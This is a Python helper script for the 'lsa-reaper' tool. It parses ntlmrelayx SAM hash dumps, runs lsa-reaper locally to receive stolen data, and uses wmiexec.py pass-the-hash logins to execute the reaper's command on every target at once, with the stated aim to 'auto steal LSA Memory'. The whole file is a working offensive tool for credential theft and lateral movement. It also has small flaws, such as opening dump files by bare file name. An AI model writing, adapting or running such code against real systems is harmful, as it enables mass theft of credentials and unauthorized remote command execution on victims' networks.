#####################################################################
#####################################################################
##                                                                 ##
##                                                                 ##
##   This is a helper program for lsa-reaper                       ##
##   that is meant to be used with ntlmrelayx's SAM dump files      ##
##   it will parse the files and auto steal LSA Memory from        ##
##   any that have working SAM creds                               ##
##                                                                 ##
##                                                                 ##
#####################################################################
#####################################################################

# sam hash format Username:account_id:LMHHASH:NTHASH:::

import os
import sys
import time
import argparse
import threading
import netifaces as ni
from pebble import ProcessPool


color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)



def start_reaper(local_ip):
    os.system('sudo python3 {}/lsa-reaper.py -oe -ip {}'.format(options.reaper, local_ip))

def execute_order(password_hash, username, target_ip, command):
    os.system('python3 {}/wmiexec.py -hashes \'{}\' {}/{}@{} \'{}\''.format(options.wmi, password_hash, target_ip, username, target_ip, command))

if __name__ == '__main__':
    if sys.platform != "linux":
        print("[!] This program is Linux only")
        exit(1)

    if os.geteuid() != 0:
        print("[!] Must be run as sudo")
        exit(1)

    parser = argparse.ArgumentParser(add_help=True, description="")
    parser.add_argument('sam', action='store', help='The directory that holds the .sam files (ex. /home/kali)')
    parser.add_argument('wmi', action='store', help='The directory that holds wmiexec.py (ex /home/kali/impacket/examples)')
    parser.add_argument('reaper', action='store', help='The directory that holds lsa-reaper.py (ex /home/kali/LSA-Reaper)')
    parser.add_argument('-account', action='store', help='Specific account to use (will ignore all others)')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    file_list = []

    # print local interfaces and ips
    print("")
    ifaces = ni.interfaces()
    for face in ifaces:
        try: # check to see if the interface has an ip
            print(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
        except BaseException as exc:
            continue

    local_ip = input("\nEnter you local ip or interface: ")

    # lets you enter eth0 as the ip
    if local_ip in ifaces:
        local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
        print("local IP => " + local_ip)

    reaper_thread = threading.Thread(target=start_reaper, args=(local_ip,)) # start lsa-reaper in -oe mode
    reaper_thread.start()

    command = input('\nEnter the command from lsa-reaper: ')

    for root, dirs, files in os.walk('{}/'.format(options.sam)): # get all file names with .sam
        for file in files:
            if file.endswith('.sam'):
                file_list.append(file)

    with ProcessPool(max_workers=10) as thread_exe: # muiltithreading
        for item in file_list: # read list of hashes from file
            with open(item, 'r') as f:
                data = f.readlines()
                f.close()
            clean_data = [newline.strip('\n') for newline in data]
            print('{} Attacking {}'.format(green_plus, item[:item.find('_')]))
            for samhash in data: #split the hashes into their own array position
                target_ip = item[:item.find('_')]
                username = samhash[:samhash.find(':')]
                password_hash = samhash[samhash.find(':', samhash.find(':')+1)+1: samhash.find(':::')]
                if options.account is not None and options.account != '':
                    if options.account == username:
                        try:
                            out = thread_exe.schedule(execute_order, (password_hash, username, target_ip, command,), timeout=60)
                        except Exception as e:
                            print(str(e))
                elif options.account is None or options.account == '':
                    try:
                        out = thread_exe.schedule(execute_order, (password_hash, username, target_ip, command,), timeout=60)
                    except Exception as e:
                        print(str(e))


    print('Completed you can press enter or Ctrl+c to exit')
